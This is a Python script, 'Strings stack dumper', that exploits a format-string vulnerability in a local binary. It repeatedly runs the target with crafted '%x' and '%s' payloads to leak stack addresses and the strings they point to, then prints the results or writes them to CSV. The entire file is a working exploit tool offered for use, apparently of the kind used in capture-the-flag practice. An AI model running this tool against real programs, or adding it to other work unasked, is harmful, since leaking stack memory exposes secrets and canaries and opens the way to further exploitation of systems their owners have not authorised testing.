#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          :
# Author             :
# Date created       :
# Date last modified :
# Python Version     : 3.*

import os
import sys
import subprocess
import string
import argparse

msg_warn = "\x1b[1m[\x1b[91mWARN\x1b[0m\x1b[1m]\x1b[0m"

def cleanup_printable(inputstring):
    """Documentation for cleanup_printable"""
    out = ""
    for c in inputstring:
        if c in string.printable[:-5]: out += c # As is
        else: out += str(bytes(c, "ISO-8859-1"))[2:-1] # Hex format
    return out



def stack_dump(binfile, verbose=False, max_depth=150):
    """Documentation for stack_dump"""
    stack, stack_entry = [],[]
    running = 1
    for k in range(1, max_depth + 1):
        if running == 1:
            stack_entry = ["", "", ""]
            line        = ""
            stack_entry[0] = "[%ebp - "+str(k).ljust(len(str(max_depth)))+"]"
            if verbose : print("\r[\x1b[1;93m%ebp\x1b[0m - \x1b[1;92m"+str(k).ljust(len(str(max_depth)))+"\x1b[0m] ",end="")

            # Creating payload to read (%ebp - k) => read address
            separator   = "|->"
            payload     = '%x'*k + separator + '%x'
            p1          = subprocess.Popen( [binfile, payload], stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="ISO-8859-1", universal_newlines=True)
            out, err    = p1.communicate(str.encode("ISO-8859-1"))
            result      = out + err
            stack_entry[1] = result.split(separator)[-1].rjust(8, "0")

            # Creating payload to read (%ebp - k) => read content
            separator   = "|->"
            payload     = '%x'*k + separator + '%s'
            p1          = subprocess.Popen([binfile, payload], stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="ISO-8859-1", universal_newlines=True)
            out, err    = p1.communicate(str.encode("ISO-8859-1"))
            result      = out + err
            stack_entry[2] = result.replace("\n",'').split(separator)[-1][:60]
            stack_entry[2] = cleanup_printable(stack_entry[2])

            # If not empty string
            if len(stack_entry[2]) > 0:
                stack.append(stack_entry)
                line  += "\x1b[1;94m"+stack_entry[1]+"\x1b[0m"
                line  += " -> " + "\x1b[1;92m"+stack_entry[2]+"\x1b[0m"
                if verbose : print(line)
            if ("stack smashing detected" in line):
                if verbose : print('stack smashing detected => (Probably a canary)')
                running = 0
    if verbose : print("")
    return stack

def stack_to_csv(stack:list, outcsvfile):
    """Documentation for stack_to_csv"""
    f = open(outcsvfile, "w")
    f.write("offset;address;content"+"\n")
    for line in stack:
        f.write('"'+line[0]+'";"0x'+line[1]+'";"'+line[2]+'"\n')
    f.close()
    return

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file",  required="True", help="String format vulnerable binary file to attack", type=str)
    parser.add_argument("-q", "--quiet", help="Quiet output",   action="store_true", default=False)
    parser.add_argument("-c", "--csv",         help="Exports findings to CSV file.", type=str, default=None)
    args = parser.parse_args()

    if os.path.isfile(args.file) :
        if os.access(args.file, os.X_OK):
            if (not args.quiet):
                print("[+]====================================================")
                print("[+]           \x1b[1;96mStrings stack dumper v1.0.1\x1b[0m")
                print("[+] \x1b[96mSearching strings like needles in in a\x1b[0m (\x1b[1;93mhay\x1b[0m)\x1b[1;92mstack\x1b[0m")
                print("[+]====================================================\n")

            if "/" in args.file: filename = args.file
            else:                filename = "./" + args.file
            if args.csv != None:
                stack_to_csv(stack_dump(filename, verbose=(not args.quiet)), args.csv)
            else:
                stack_dump(filename, verbose=(not args.quiet))
        else:
            print(msg_warn, "This file is not executable.")
    else :
        print(msg_warn, "Could not access file "+args.file+".")








    #
    # if len(sys.argv) != 2:
    #     print("Usage : python3 "+sys.argv[0]+" binfile")
    # else :
    #     binfile = sys.argv[1]
    #     if os.path.isfile(binfile) :
    #         if os.access(binfile, os.X_OK):
    #             print("[+]==============================================")
    #             print("[+] Stack dumper - Searching strings")
    #             print("[+]==============================================\n")
    #             stack_to_csv(stack_dump(binfile, verbose=True), "stack.csv")
    #         else:
    #             print(msg_warn, "This file is not executable.")
    #     else :
    #         print(msg_warn, "Could not access file.")
